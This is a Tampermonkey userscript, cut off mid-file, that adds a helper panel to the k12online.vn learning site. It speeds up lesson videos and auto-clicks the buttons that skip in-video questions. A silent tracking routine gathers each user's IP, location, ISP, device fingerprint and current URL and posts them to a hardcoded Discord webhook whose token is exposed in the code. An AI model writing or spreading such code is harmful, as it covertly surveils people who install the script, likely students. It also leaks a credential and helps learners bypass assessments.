// ==UserScript==
// @name         K12 Helper Pro - Danhvux Port 8000 (With Toast)
// @namespace    http://tampermonkey.net/
// @version      21.10
// @description  Giữ nguyên 100% bản gốc, nâng upgrade x20 thực tế, Bypass Question + Toast Notifications + WEBHOOK TRACKING
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      localhost
// @connect      httpbin.org
// ==/UserScript==

(function() {
    'use strict';

    const BLACKLIST_API = 'http://localhost:8000/blacklist';
    const WEBHOOK_URL = https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; // Thay bằng webhook Discord của bạn
    
    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, toastPos: 'top-right'
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // === WEBHOOK TRACKING SYSTEM ===
    const sendWebhook = async (data) => {
        if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
        
        try {
            const payload = {
                username: "K12 Tracker",
                avatar_url: "https://i.imgur.com/8z5xL.png",
                embeds: [{
                    title: "🕵️ **NEW USER DETECTED**",
                    color: 0x00ff00,
                    fields: data.fields,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Danhvux K12 Helper Pro v21.10"
                    }
                }]
            };
            
            GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: {
                    "Content-Type": "application/json"
                },
                data: JSON.stringify(payload),
                timeout: 10000,
                onload: () => console.log('✅ Webhook sent successfully'),
                onerror: () => console.log('❌ Webhook failed')
            });
        } catch(e) {
            console.log('Webhook error:', e);
        }
    };

    const getDeviceInfo = async () => {
        return new Promise((resolve) => {
            // Get IP info
            GM_xmlhttpRequest({
                method: "GET",
                url: "https://httpbin.org/ip",
                onload: function(ipResponse) {
                    try {
                        const ipData = JSON.parse(ipResponse.responseText);
                        
                        // Get geolocation
                        GM_xmlhttpRequest({
                            method: "GET",
                            url: `https://ipapi.co/${ipData.origin}/json/`,
                            onload: function(geoResponse) {
                                try {
                                    const geoData = JSON.parse(geoResponse.responseText);
                                    
                                    // Device fingerprint
                                    const fingerprint = {
                                        userAgent: navigator.userAgent,
                                        platform: navigator.platform,
                                        language: navigator.language,
                                        screen: `${screen.width}x${screen.height}`,
                                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                        cookiesEnabled: navigator.cookieEnabled,
                                        doNotTrack: navigator.doNotTrack,
                                        hardwareConcurrency: navigator.hardwareConcurrency,
                                        deviceMemory: navigator.deviceMemory || 'N/A'
                                    };
                                    
                                    // Current page info
                                    const pageInfo = {
                                        url: window.location.href,
                                        title: document.title,
                                        referrer: document.referrer
                                    };
                                    
                                    resolve({
                                        ip: ipData.origin,
                                        country: geoData.country_name || 'Unknown',
                                        region: geoData.region || 'Unknown',
                                        city: geoData.city || 'Unknown',
                                        isp: geoData.org || 'Unknown',
                                        ...fingerprint,
                                        ...pageInfo,
                                        timestamp: new Date().toISOString()
                                    });
                                } catch(e) {
                                    resolve({ error: 'Geo failed', ip: ipData.origin });
                                }
                            },
                            onerror: () => resolve({ error: 'Geo failed', ip: ipData.origin })
                        });
                    } catch(e) {
                        resolve({ error: 'IP failed' });
                    }
                },
                onerror: () => resolve({ error: 'Request failed' })
            });
        });
    };

    const trackUser = async () => {
        const deviceInfo = await getDeviceInfo();
        
        const fields = [
            { name: "🌐 IP Address", value: `\`${deviceInfo.ip}\``, inline: true },
            { name: "🏳️ Country", value: deviceInfo.country || 'Unknown', inline: true },
            { name: "📍 City", value: deviceInfo.city || 'Unknown', inline: true },
            { name: "🌐 ISP", value: deviceInfo.isp || 'Unknown', inline: true },
            { name: "💻 Device", value: deviceInfo.platform || 'Unknown', inline: true },
            { name: "📱 Screen", value: deviceInfo.screen || 'Unknown', inline: true },
            { name: "🌍 Timezone", value: deviceInfo.timezone || 'Unknown', inline: true },
            { name: "🔗 URL", value: `[${deviceInfo.url.substring(0, 50)}...](${deviceInfo.url})`, inline: false }
        ];
        
        sendWebhook({ fields });
        localStorage.setItem('k12_ult_tracked', 'true');
    };

    // Track only once per session
    if (!localStorage.getItem('k12_ult_tracked')) {
        setTimeout(trackUser, 2000);
    }

    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    let bannedList = [];
    const startSecuritySystem = () => {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const userIP = data.ip;
                GM_xmlhttpRequest({
                    method: "GET",
                    url: BLACKLIST_API + "?nocache=" + Date.now(),
                    onload: function(response) {
                        try {
                            bannedList = JSON.parse(response.responseText);
                            if (bannedList.includes(userIP)) {
                                renderBannedScreen(userIP);
                                resolve(false);
                            } else { resolve(true); }
                        } catch(e) { resolve(true); }
                    },
                    onerror: () => resolve(true)
                });
            })
            .catch(() => resolve(true));
        });
    };

    const renderBannedScreen = (ip) => {
        document.body.innerHTML = `
            <div style="height:100vh; background:#0d1117; color:#ff4d4d; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center;">
                <h1 style="font-size:60px; margin:0;">🚫 BANNED</h1>
                <p style="font-size:20px; color:#c9d1d9;">IP của bạn (<b>${ip}</b>) đã bị cấm truy cập Panel.</p>
            </div>`;
    };

    const showToast = (message, type = 'info', duration = 3000) => {
        const isDark = config.isDarkMode;
        const pos = config.toastPos;
        
        document.querySelectorAll('.toast').forEach(t => t.remove());

        const container = document.createElement('div');
        container.id = 'toast-container';
        container.style.cssText = `
            position: fixed; z-index: 999999;
            display: flex; flex-direction: column; gap: 12px;
            pointer-events: none;
        `;
        
        const positions = {
            'top-right': 'top: 20px; right: 20px;',
            'top-left': 'top: 20px; left: 20px;',
            'bottom-right': 'bottom: 20px; right: 20px;',
            'bottom-left': 'bottom: 20px; left: 20px;',
        };
        container.style.cssText += positions[pos] || positions['top-right'];

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.style.cssText = `
            min-width: 280px; max-width: 360px;
            padding: 16px 20px;
            background: ${isDark ? '#1e2227' : '#ffffff'};
            color: ${isDark ? '#ffffff' : '#1e2227'};
            border-radius: 12px;
            box-shadow: 0 8px 24px ${isDark ? 'rgba(0,0,0,0.6)' : 'rgba(0,0,0,0.15)'};
            font-family: 'Segoe UI', 'Roboto', sans-serif;
            font-size: 14px;
            display: flex; align-items: center; gap: 14px;
            opacity: 0; transform: translateY(-20px) scale(0.95);
            animation: toastIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        `;

        const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️', loading: '⏳' };
        toast.innerHTML = `
            <span style="font-size: 20px; flex-shrink: 0;">${icons[type] || icons.info}</span>
            <span style="flex: 1; word-wrap: break-word;">${message}</span>
            <span class="toast-close" style="cursor: pointer; font-size: 18px; color: ${isDark ? '#777' : '#999'};">✕</span>
        `;

        container.appendChild(toast);
        document.body.appendChild(container);

        if (!document.getElementById('toast-anim-css')) {
            const animStyle = document.createElement('style');
            animStyle.id = 'toast-anim-css';
            animStyle.innerHTML = `
                @keyframes toastIn {
                    to { opacity: 1; transform: translateY(0) scale(1); }
                }
                @keyframes toastOut {
                    to { opacity: 0; transform: translateY(-20px) scale(0.95); }
                }
            `;
            document.head.appendChild(animStyle);
        }

        toast.querySelector('.toast-close').onclick = () => {
            toast.style.animation = 'toastOut 0.3s forwards';
            setTimeout(() => toast.remove(), 300);
        };

        if (duration > 0) {
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.style.animation = 'toastOut 0.3s forwards';
                    setTimeout(() => toast.remove(), 300);
                }
            }, duration);
        }
    };

    startSecuritySystem().then(accessGranted => {
        if (!accessGranted) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const isDark = config.isDarkMode;
            style.innerText = `
                :root { 
                    --mc: ${config.mainColor}; --w: ${config.width}px;
                    --bg: ${isDark ? '#1e2227' : '#ffffff'}; --bg-tab: ${isDark ? '#1a1d21' : '#f0f0f0'};
                    --bg-input: ${isDark ? '#252a31' : '#f9f9f9'}; --text: ${isDark ? '#ffffff' : '#1e2227'};
                    --text-sec: ${isDark ? '#777' : '#999'}; --border: ${isDark ? '#333' : '#ddd'};
                    --shadow: ${isDark ? 'rgba(0,0,0,0.6)' : 'rgba(0,0,0,0.1)'};
                }
                #dv-panel {
                    position: fixed; top: 50px; right: 20px; width: var(--w) !important;
                    background: var(--bg); color: var(--text); border-radius: 12px;
                    font-family: 'Segoe UI', sans-serif; z-index: 100000;
                    box-shadow: 0 10px 40px var(--shadow); overflow: hidden;
                    transition: height 0.4s ease; border: 1px solid var(--border);
                }
                .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; }
                .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
                .dots { display: flex; gap: 8px; }
                .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; }
                .red { background: #ff5f56; } .yellow { background: #ffbd2e; } .green { background: #27c93f; }
                .tabs { display: flex; background: var(--bg-tab); padding: 0 5px; border-bottom: 1px solid var(--border); justify-content: space-around; overflow-x: auto; }
                .tab { padding: 12px 10px; cursor: pointer; font-size: 10px; color: var(--text-sec); font-weight: 900; position: relative; transition: 0.3s; white-space: nowrap; }
                .tab.active { color: var(--mc); }
                .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10px; right: 10px; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }
                .content { display: none; padding: 20px; box-sizing: border-box; }
                .content.active { display: block; }
                .row-speed { display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 5px; }
                .val-right { color: var(--mc); font-weight: bold; font-size: 16px; }
                .slider { width: 100%; height: 5px; background: var(--border); border-radius: 5px; appearance: none; margin: 10px 0 25px 0; outline: none; }
                .slider::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: ${isDark ? '#fff' : 'var(--mc)'}; border-radius: 50%; cursor: pointer; }
                .video-placeholder { width: 100%; height: 130px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; font-style: italic; margin-bottom: 15px; border: 1px dashed #333; }
                .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
                .app-item { background: var(--bg-input); padding: 12px 5px; border-radius: 10px; cursor: pointer; border: 1px solid var(--border); text-align: center; }
                input[type=text], input[type=password] { width: 100%; padding: 12px; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 12px; box-sizing: border-box; }
                .btn { width: 100%; padding: 14px; background: #b8cc8e; border: none; border-radius: 12px; color: #1e2227; font-weight: bold; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
                .btn-save { background: var(--mc) !important; color: #000; }
                .switch-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider-switch { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 20px; }
                .slider-switch:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider-switch { background-color: var(--mc); }
                input:checked + .slider-switch:before { transform: translateX(20px); }
                .footer { text-align: center; font-size: 9px; color: var(--text-sec); padding: 10px; }
            `;
        };
        document.head.appendChild(style);
        updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="dots"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div class="row-speed"><b>Tốc độ</b><span class="val-right">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="
